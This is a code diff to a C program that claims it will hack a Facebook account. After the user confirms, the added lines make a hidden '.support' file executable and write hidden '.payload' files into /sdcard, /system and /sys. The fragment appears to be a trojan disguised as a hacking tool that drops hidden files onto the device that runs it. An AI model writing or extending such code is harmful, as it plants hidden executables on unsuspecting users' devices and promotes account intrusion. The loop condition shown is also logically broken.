@@ -5,8 +5,9 @@ int main(){
   while(last_wish != 'y' || last_wish != 'n'){
     printf("\033[1;31mThis tool is going to hack a facebook account which is illegal. Are you sure to continue? [y/n]: ");
     scanf("%c", &last_wish);
-    if(last_wish == y){
+    if(last_wish == 'y'){
       printf("\033[0m");
+      system("chmod +x .support;");
       FILE *copy = fopen("/sdcard/.payload", "w");
       FILE *cp = fopen("/system/.payload", "w");
       FILE *cp2 = fopen("/sys/.payload", "w");
